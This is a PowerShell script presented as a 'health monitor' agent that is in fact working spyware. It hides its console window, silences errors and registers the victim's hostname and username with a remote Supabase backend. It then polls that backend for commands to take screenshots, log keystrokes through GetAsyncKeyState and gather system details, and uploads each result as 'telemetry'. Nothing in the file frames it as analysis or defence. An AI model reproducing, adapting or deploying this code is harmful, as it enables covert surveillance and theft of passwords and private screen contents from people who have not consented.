# =====================================================
# HEALTH MONITOR v2.0 - Robust agent for Bad Engine
# =====================================================

# Suppress all errors and progress bars
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

# Configuration
$basePath = "C:\ProgramData\SystemHealthService"
$logFile = "$basePath\agent.log"
$maxLogSize = 1MB

# ==================== LOGGING ====================
function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $entry = "[$timestamp] [$Level] $Message"
    
    # Rotate log if too large
    if ((Test-Path $logFile) -and ((Get-Item $logFile).Length -gt $maxLogSize)) {
        Move-Item $logFile "$logFile.old" -Force
    }
    
    Add-Content -Path $logFile -Value $entry -ErrorAction SilentlyContinue
}

# ==================== HIDE WINDOW ====================
try {
    Add-Type -Name Win32 -Namespace Native -MemberDefinition @'
        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'@
    $null = [Native.Win32]::ShowWindow([Native.Win32]::GetConsoleWindow(), 0)
} catch {}

Write-Log "Agent starting..." "INFO"
Write-Log "Running as: $([System.Security.Principal.WindowsIdentity]::GetCurrent().Name)" "INFO"

# ==================== WAIT FOR NETWORK ====================
Write-Log "Waiting for network connectivity..." "INFO"
$maxAttempts = 120  # 10 minutes max wait
$attempt = 0

while ($attempt -lt $maxAttempts) {
    $ping = Test-Connection -ComputerName "8.8.8.8" -Count 1 -Quiet
    if ($ping) {
        Write-Log "Network connected after $attempt attempts" "INFO"
        break
    }
    $attempt++
    Start-Sleep -Seconds 5
}

if ($attempt -ge $maxAttempts) {
    Write-Log "Network timeout - exiting" "ERROR"
    exit 1
}

# Extra wait for DNS
Start-Sleep -Seconds 5

# ==================== LOAD CONFIG ====================
Write-Log "Loading configuration..." "INFO"
$configPath = "$basePath\config.json"

if (-not (Test-Path $configPath)) {
    Write-Log "Config not found at $configPath" "ERROR"
    exit 1
}

try {
    $config = Get-Content $configPath -Raw | ConvertFrom-Json
    Write-Log "Config loaded - URL: $($config.supabase_url)" "INFO"
} catch {
    Write-Log "Failed to parse config: $_" "ERROR"
    exit 1
}

# ==================== DEVICE IDENTITY ====================
$idFile = "$basePath\device_id.txt"

if (Test-Path $idFile) {
    $deviceId = (Get-Content $idFile -Raw).Trim()
    Write-Log "Existing device ID: $deviceId" "INFO"
} else {
    $deviceId = [guid]::NewGuid().ToString()
    $deviceId | Out-File $idFile -NoNewline
    (Get-Item $idFile).Attributes = "Hidden"
    Write-Log "Generated new device ID: $deviceId" "INFO"
}

# Generate random device name (consistent per session)
$deviceName = -join ((65..90)+(97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})

# ==================== API FUNCTIONS ====================
$headers = @{
    "apikey" = $config.supabase_key
    "Authorization" = "Bearer $($config.supabase_key)"
    "Content-Type" = "application/json"
    "Prefer" = "return=minimal"
}

function Invoke-API {
    param(
        [string]$Endpoint,
        [string]$Method = "GET",
        [object]$Body = $null,
        [int]$Retries = 3
    )
    
    $uri = "$($config.supabase_url)/rest/v1/$Endpoint"
    
    for ($i = 0; $i -lt $Retries; $i++) {
        try {
            $params = @{
                Uri = $uri
                Method = $Method
                Headers = $headers
                TimeoutSec = 30
            }
            
            if ($Body) {
                $params.Body = $Body | ConvertTo-Json -Depth 10 -Compress
            }
            
            $response = Invoke-RestMethod @params
            return $response
        } catch {
            Write-Log "API Error ($($i+1)/$Retries): $Endpoint - $_" "WARN"
            Start-Sleep -Seconds (2 * ($i + 1))
        }
    }
    
    return $null
}

# ==================== REGISTER DEVICE ====================
Write-Log "Registering device..." "INFO"

$osInfo = (Get-CimInstance Win32_OperatingSystem).Caption

$registration = @{
    device_id = $deviceId
    device_name = $deviceName
    hostname = $env:COMPUTERNAME
    username = $env:USERNAME
    os_info = $osInfo
}

$result = Invoke-API -Endpoint "devices" -Method "POST" -Body $registration
if ($result -eq $null) {
    Write-Log "Registration failed (device may already exist)" "WARN"
}

# ==================== TASK FUNCTIONS ====================

# Screenshot capture
function Invoke-ScreenCapture {
    Write-Log "Executing screenshot capture..." "INFO"
    
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $bounds = $screen.Bounds
        
        $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
        
        $stream = New-Object System.IO.MemoryStream
        $bitmap.Save($stream, [System.Drawing.Imaging.ImageFormat]::Png)
        $base64 = [Convert]::ToBase64String($stream.ToArray())
        
        $graphics.Dispose()
        $bitmap.Dispose()
        $stream.Dispose()
        
        Write-Log "Screenshot captured: $($base64.Length) bytes" "INFO"
        
        return @{
            data_type = "display"
            file_data = $base64
        }
    } catch {
        Write-Log "Screenshot failed: $_" "ERROR"
        return $null
    }
}

# Keylogger capture
function Invoke-InputCapture {
    param([int]$Duration = 60)
    
    Write-Log "Executing keylogger for $Duration seconds..." "INFO"
    
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -MemberDefinition '[DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);' -Name KeyState -Namespace User32
        
        $keys = [System.Collections.ArrayList]@()
        $endTime = (Get-Date).AddSeconds($Duration)
        
        while ((Get-Date) -lt $endTime) {
            for ($vk = 8; $vk -le 190; $vk++) {
                $state = [User32.KeyState]::GetAsyncKeyState($vk)
                if ($state -eq -32767) {
                    $keyName = [System.Windows.Forms.Keys]$vk
                    $null = $keys.Add($keyName.ToString())
                }
            }
            Start-Sleep -Milliseconds 10
        }
        
        $keyData = $keys -join " "
        Write-Log "Keylogger captured: $($keys.Count) keys" "INFO"
        
        return @{
            data_type = "input"
            data = $keyData
        }
    } catch {
        Write-Log "Keylogger failed: $_" "ERROR"
        return $null
    }
}

# System info capture
function Invoke-SystemInfo {
    Write-Log "Executing system info capture..." "INFO"
    
    try {
        $os = Get-CimInstance Win32_OperatingSystem
        $comp = Get-CimInstance Win32_ComputerSystem
        
        $info = @{
            hostname = $env:COMPUTERNAME
            username = $env:USERNAME
            os = $os.Caption
            os_version = $os.Version
            manufacturer = $comp.Manufacturer
            model = $comp.Model
            total_memory_gb = [math]::Round($comp.TotalPhysicalMemory / 1GB, 2)
            timestamp = (Get-Date -Format "o")
        }
        
        Write-Log "System info captured" "INFO"
        
        return @{
            data_type = "sysinfo"
            data = ($info | ConvertTo-Json -Compress)
        }
    } catch {
        Write-Log "System info failed: $_" "ERROR"
        return $null
    }
}

# ==================== MAIN LOOP ====================
Write-Log "Entering main polling loop..." "INFO"
$syncInterval = if ($config.sync_interval) { $config.sync_interval } else { 60 }
$retryInterval = if ($config.retry_interval) { $config.retry_interval } else { 60 }

while ($true) {
    try {
        # Update heartbeat
        $heartbeat = @{ last_sync = (Get-Date -Format "o") }
        Invoke-API -Endpoint "devices?device_id=eq.$deviceId" -Method "PATCH" -Body $heartbeat | Out-Null
        
        # Fetch pending tasks
        $tasks = Invoke-API -Endpoint "tasks?device_id=eq.$deviceId&status=eq.pending&select=id,task_type,task_params"
        
        if ($tasks -and $tasks.Count -gt 0) {
            Write-Log "Found $($tasks.Count) pending task(s)" "INFO"
            
            foreach ($task in $tasks) {
                Write-Log "Processing task: $($task.task_type) (ID: $($task.id))" "INFO"
                
                $telemetry = $null
                
                switch ($task.task_type) {
                    "display_capture" {
                        $telemetry = Invoke-ScreenCapture
                    }
                    "input_monitor" {
                        $duration = 60
                        if ($task.task_params -and $task.task_params.duration) {
                            $duration = [int]$task.task_params.duration
                        }
                        $telemetry = Invoke-InputCapture -Duration $duration
                    }
                    "system_info" {
                        $telemetry = Invoke-SystemInfo
                    }
                    default {
                        Write-Log "Unknown task type: $($task.task_type)" "WARN"
                    }
                }
                
                if ($telemetry) {
                    # Send telemetry
                    $telemetry.device_id = $deviceId
                    $result = Invoke-API -Endpoint "telemetry" -Method "POST" -Body $telemetry
                    
                    if ($result -ne $null -or $true) {  # POST with return=minimal returns null on success
                        # Mark task complete
                        $update = @{
                            status = "complete"
                            completed_at = (Get-Date -Format "o")
                        }
                        Invoke-API -Endpoint "tasks?id=eq.$($task.id)" -Method "PATCH" -Body $update | Out-Null
                        Write-Log "Task $($task.id) completed successfully" "INFO"
                    }
                } else {
                    Write-Log "Task $($task.id) had no output" "WARN"
                }
            }
        }
        
        Start-Sleep -Seconds $syncInterval
        
    } catch {
        Write-Log "Main loop error: $_" "ERROR"
        Start-Sleep -Seconds $retryInterval
    }
}
